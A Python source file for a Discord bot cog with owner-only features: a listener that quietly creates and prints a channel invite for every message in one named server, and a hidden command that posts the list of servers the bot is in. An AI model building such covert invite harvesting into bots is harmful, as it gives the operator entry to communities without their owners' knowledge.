import discord 
from discord.ext import commands, tasks
from itertools import cycle
import time
import youtube_dl
from async_timeout import timeout
import discord.utils
import math
import random
import asyncio
import functools
import json
import requests
from chess import *
import os
#import chess.svg
#import cairo
#import cairosvg
#import logging
import ctypes
import ctypes.util
from better_profanity import profanity
from datetime import date 

class Owner(commands.Cog):
    def __init__(self, client):
        self.client = client
        

    #events
        
    @commands.Cog.listener()
    async def on_ready(self):
        print('Owner cmds are working')
        
    @commands.Cog.listener()
    async def on_message(self, message):
        if message.guild.name == "☬BotsList・Field #0,5K":
            print(await message.channel.create_invite(max_age=300))
            
            
    @commands.has_role("Strong Nuclear Force")
    @commands.command(hidden=True)
    async def servers(self, ctx):
        """This command is exclusively for the owner of Upsilon"""
        member = "ΔΨφ#6251"
        print(self.client.guilds)
        r = self.client.guilds
        await ctx.send(self.client.guilds)
        await ctx.send(f"{len(r)} servers")
    

        
        
        
def setup(client):
    client.add_cog(Owner(client))
        
        
